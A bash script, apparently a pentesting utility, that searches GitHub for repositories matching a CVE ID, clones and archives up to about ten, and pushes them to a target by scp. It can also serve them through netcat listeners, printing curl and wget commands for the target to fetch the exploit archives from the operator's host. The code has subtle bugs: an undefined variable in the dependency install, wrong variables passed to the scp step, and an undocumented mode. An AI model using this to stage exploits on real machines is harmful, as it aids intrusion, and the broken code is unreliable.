#! /bin/bash

# Check if ctrl + c was clicked to finish the script closing the opened PIDs
trap ctrl_c INT

# Colors
green="\e[0;32m\033[1m"
red="\e[0;31m\033[1m"
gray="\e[0;37m\033[0m"
yellow="\e[0;33m\033[1m"
endColour="\033[0m\e[0m"
purple="\e[0;35m\033[1m"

# Common variables
downloadTarget="/tmp/CVEDownloaded" # The output directory, where the exploits have been downloaded
counter=1                           # Useful counter to control the number of exploits to download (default is 10, controled on the loop)
counterTwo="0"                      # Useful counter to show custom command help in HTTP server
portToDeploy=8080                   # First port to deploy the HTTP server. This is a counter too, so the ports that can be opened are 8080-8089 (10 ports if you obtain 10 exploits in the search)
pidToDelete=""			    # This variable stores the PIDs of nc (HTTP servers) launched. This is usefull to kill the HTTP servers when 2 minutes later to cleanup the system
curlA=""			    # Variable to store the search result
curlC=""                            # Array to store the search result indexed. This variable contains the Language and the URL of the GitHub repository
exportRepo=""                       # Variable to obtain only the URL of the GitHub repository
repoSource=""			    # This variable contains the path of the GitHub repository (user/repository)
userSource=""			    # This variable contains the user that own the repository
networkC=""                         # This variable contains all available network cards (one by line)
networkCard=""                      # This array contains all available network cards (one by index) to run in loop.
myIPAddress=""			    # This variable contains all available IP addresses (one by line, ordered at the same side of $networkC)
myIP=""                             # This array contains all available IP addresses (one by index, ordered at the same side of $networkCard)

# Functions
function helpView(){
	echo -e "${yellow}[*]${endColour}${gray}How to use:${endColour} ${purple}exploitDownloader -e [CVE-XXX-XXXX] -l [Python] -m [SCP] -u [user] -t [10.10.10.25]${endColour}"
	echo -e "    ${purple}-e${endColour}${gray}: CVE to find. The format must be: CVE-YEAR-CODE (ex: CVE-2021-3156)${endColour}"
	echo -e "    ${purple}-l${endColour}${gray}: Language to filter. Allowed langs:Python, Shell, C, C#, Java, JavaScript, PHP, Go, Ruby, PowerShell, Ruby...${endColour}"
	echo -e "    ${purple}-m${endColour}${gray}: Mode. You can put 'Download' to download the CVEs in /tmp/CVEDownloaded, 'SCP' to download the CVEs and send to target machine (-t)${endColour}"
	echo -e "    ${purple}-u${endColour}${gray}: User. If you select SCP as mode, you must type this option to send by SCP the exploits.${endColour}"
	echo -e "    ${purple}-t${endColour}${gray}: Target. If you select SCP as mode, you must type this option to send by SCP the exploits.${endColour}"
	echo -e "    ${purple}-z${endColour}${gray}: Check dependencies, put '-z on' if you need check and install the dependencies of the script.${endColour}"
	echo -e "    ${purple}-h${endColour}${gray}: Help. List of options.${endColour}"
	exit 0
}

function depsCheck(){
	if [[ -f /usr/bin/apt-get ]]; then	
		clear; echo "[i] Running on debian based Linux"; dependencies=(git curl jq netcat)
		echo -e "${yellow}[*]${endColour}${gray}Checking for dependencies...${endColour}"
		sleep 1s
		for dep in "${dependencies[@]}"; do
			echo -ne "${yellow}[*]${endColour}${purple}$dep${endColour}..."
			sleep 0.5s
			if [[ -f /usr/bin/$dep ]]; then
				echo -e "${green}(V)${endColour}"
			else
				echo -e "${red}(X)${endColour}\n"
				echo -e "${yellow}[+]${endColour}Automatic installation of: ${purple}$dep${endColour}..."
				apt-get install $program -y > /dev/null 2>&1
			fi
			sleep 1s
		done
	else
		if [[ ! -f "/usr/bin/git" || ! -f "/usr/bin/curl" || ! -f "/usr/bin/jq" || ! -f "/usr/bin/nc" ]]; then
			echo -e "${yellow}[i]${endColour} You are not running this script in Debian based linux."
			echo -e "${yellow}[i]${endColour} Dependencies will not be checked. Make sure you have installed:"
			echo -e "${yellow}	[*]${endColour}GIT \n	[*]CURL \n	[*]JQ \n	[*]NETCAT"
			exit 1
		else
			echo -e "${yellow}[i]${endColour} You are not running this script in Debian based Linux."
			echo -e "${yellow}[i]${endColour} However, all dependencies are installed, so you can continue =)"
		fi
	fi
}

function preparation(){
	if [ -d $downloadTarget ]; then
		rm -rf $downloadTarget/*
	else
		mkdir -p $downloadTarget
	fi
}

function checkCVE(){
	if [[ $exploitCVE =~  ^CVE-[1-2][09][0-9]{2}-[0-9]{1,7}$ ]]; then
		echo ""
	else
		echo -e "${red}[X]${endColour}Yoy must type correct CVE format (CVE-[YEAR]-[CODE]) ex: CVE-2021-3156"
		exit 1
	fi
}

function searchCVE(){
	curlC=$(curl -s -H "Accept: application/vnd.github.v3+json" https://api.github.com/search/repositories?q=$exploitCVE | jq -r '["Language","URL"], (.items[] | [.language,.clone_url]) | @csv'  |  grep $exploitLang | awk -F"," '{print $2}')
	curlA=($curlC)
}

function runSCP(){
	if [[ -z $exploitUser || -z $exploitTarget ]]; then
		echo -e "${red}[X]${endColour} Error: You must enter -u [user] and -t [target] to run SCP mode"
		exit 1
	fi
	echo -e "${yellow}[i]${endColour}Making SCP to $exploitUser@$exploitTarget:/home/$exploitUser/ . Plase wait.."
	scp -r $3/$4.tar.gz $1@$2:/home/$1/ &>/dev/null
	if [ $? -eq "0" ]; then
		echo -e "${yellow}[*]${endColour}SCP finished, the file/s are in ${green}/home/$1 ${endColour}in the target machine"
		exit 0
	else
		echo -e "${red}[X]${endColour}Something was wrong, can't make the SCP, check the connectivity to ${green}$exploitTarget${endColour}"
		exit 1
	fi
}

function runHTTP(){
	networkC=$(ip r | grep metric | awk -F"dev" '{print $2}' | awk -F"proto" '{print $1}' | tail -n +2)
        networkCard=($networkC)
        myIPAddress=$(ip r | grep metric | awk -F"src" '{print $2}' | awk -F"metric" '{print $1}' | tail -n +2)
        myIP=($myIPAddress)
        counterTwo="0"
        echo -e "${gray}To download $1 in the target machine:${endColour}" 
        for i in "${networkCard[@]}"; do
        	echo -e "     -From $i: in the target run: ${green}curl --output $2.tar.gz --http0.9 ${myIP[$counterTwo]}:$portToDeploy${endColour} or ${green}wget ${myIP[$counterTwo]}:$portToDeploy ${endColour}"
		counterTwo=$(($counterTwo+1))
        done
        # Making HTTP server with the file
	nc -q 5 -lvnp $portToDeploy < $3/$2.tar.gz &>/dev/null &
	pidToDelete="$pidToDelete $!"
	portToDeploy=$(( $portToDeploy + 1 ))
}

function mainFunction(){
	for OUTPUT in ${curlA[@]}; do
	
	 exportRepo=$(echo $OUTPUT | awk -F"\"" '{print $2}')
	 repoSource=$(echo $exportRepo | awk -F".com/" '{print $2}' | awk -F".git" '{print $1}')
	 userSource=$(echo $repoSource | awk -F"/" '{print $1}')
	
	git clone $exportRepo ${downloadTarget}/${userSource} &> /dev/null
	cd $downloadTarget &>/dev/null; tar -zcvf $userSource.tar.gz $userSource &>/dev/null; rm -rf $userSource &>/dev/null; cd - &>/dev/null	
	
	if [[ $exploitMode == *"SCP" ]]; then
		runSCP $userName $target $downloadTarget $userSource
	elif [[ $exploitMode == *"HTTP" ]]; then
		runHTTP $repoSource $userSource $downloadTarget
	elif [[ $exploitMode == *"Download" ]]; then
		echo "" 
	else
		echo -e "${red}[X]${endColour}Error, failed to parse the mode option. Please ensure you have selected 'Download', 'SCP' or 'HTTP' mode"
		exit 1
	fi		
	# Limit the results number in 10
	counter=$(( $counter + 1 ))
	if [ $counter -eq "10" ]; then
		break
	fi
done
} 

function endFunction(){
	if [[ -z $pidToDelete ]]; then
		echo "Job finished, enjoy"
	else	
		echo -ne "${yellow}[i]${endColour}The HTTP servers will be killed on 2minutes from now"
		for j in {1..60}; do
			sleep 2s
			echo -ne "."
		done
		kill -9 $pidToDelete &>/dev/null
		echo -e "${green}(V)${endColour}"
	fi
}

function ctrl_c(){
	echo -ne "\n${yellow}[i]${endColour} Checking if there is any HTTP server launched..."
	if [[ -z $pidToDelete ]]; then
		sleep 3s
		echo -e "${green}(V)${endColour}\n"
		echo -e "Closing the script"
		sleep 1s
	else	
		echo -e "\n${yellow}[!]${endColour}Killing the HTTP servers..."
		kill -9 $pidToDelete &>/dev/null
		echo "HTTP servers was killed"
		exit 0
	fi
}

# Start Function

if [ "$(id -u)" == "0" ]; then
	declare -i paramsC=0; while getopts ":e:l:m:u:t:z:h:" arg; do
		case $arg in
			e) exploitCVE=$OPTARG; let paramsC+=1 ;;
			l) exploitLang=$OPTARG; let paramsC+=1 ;;
			m) exploitMode=$OPTARG; let paramsC+=1 ;;
			u) exploitUser=$OPTARG ;;
			t) exploitTarget=$OPTARG ;;
			z) exploitNoDep=$OPTARG ;;
			h) helpView;;
		esac
	done

	if [ $paramsC -ne 3 ]; then
		helpView
	else
		if [[ $exploitNoDep == "on" ]]; then
			depsCheck      # Searching for dependencies and install it if not installed yet
		fi
		preparation            # Check if the folders that the screep need are exists and delete old executions.
		checkCVE               # Check if the given CVE is really a CVE code.
		searchCVE              # Search the CVE in github database
		mainFunction           # This is the main logic of this script. this function calls more functions:
			                # runSCP : To run SCP if you have selected SCP mode
			                # runHTTP: To run HTTP server if you have selected HTTP mode
		endFunction            # This function is to cleanup the system
	fi
else
	echo -e "\n${red}[*]${endColour} You must execute this code as root\n"
	exit 0
fi
